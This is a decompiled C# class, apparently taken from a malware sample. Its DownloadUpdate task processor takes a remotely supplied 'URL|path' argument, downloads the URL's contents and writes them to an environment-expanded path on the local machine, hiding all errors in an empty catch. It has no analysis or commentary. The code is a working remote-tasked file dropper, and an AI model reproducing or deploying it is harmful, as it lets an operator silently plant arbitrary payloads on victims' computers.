using System;
using System.IO;
using System.Net;

// Token: 0x0200002A RID: 42
public class DownloadUpdate : ITaskProcessor
{
	// Token: 0x060000BC RID: 188 RVA: 0x00007A78 File Offset: 0x00005C78
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.Download;
	}

	// Token: 0x060000BD RID: 189 RVA: 0x00007A80 File Offset: 0x00005C80
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			string[] array = updateTask.TaskArg.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
		}
		catch
		{
		}
		return true;
	}
}
